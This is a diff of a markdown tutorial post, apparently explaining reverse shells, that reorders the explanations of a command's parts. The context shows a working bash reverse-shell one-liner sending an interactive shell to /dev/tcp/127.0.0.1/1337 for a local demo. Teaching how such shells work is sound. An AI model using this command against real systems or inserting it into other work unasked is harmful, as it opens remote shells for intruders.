@@ -42,11 +42,11 @@ Now in another terminal window, run this command to 'connect' to the listener. P
 /bin/bash --rcfile <(echo "PS1='omghacker: '") -i >& /dev/tcp/127.0.0.1/1337 0>&1
 ```
 
-The `/bin/bash` starts a new shell.  
-The `-i` makes it interactive.   
-The `--rcfile` bit is just something I've added to make the prompt look different, but isn't necessary.
-The `>& /dev/tcp/...` redirects the input and output to the listener by making use of the [`/dev/tcp` feature in Linux Bash](2024-07-28-networking-cheat-sheet.md#reach-a-port-on-a-server).  
-The `0>&1` redirects both standard input and output to the listener.    
+The `/bin/bash` starts a new shell.    
+The `-i` makes it interactive.     
+The `>& /dev/tcp/...` redirects the input and output to the listener by making use of the [`/dev/tcp` feature in Linux Bash](2024-07-28-networking-cheat-sheet.md#reach-a-port-on-a-server).    
+The `0>&1` redirects both standard input and output to the listener.      
+The `--rcfile` bit is just something I've added for the next step, but isn't necessary.  
 
 ## What happens?
 
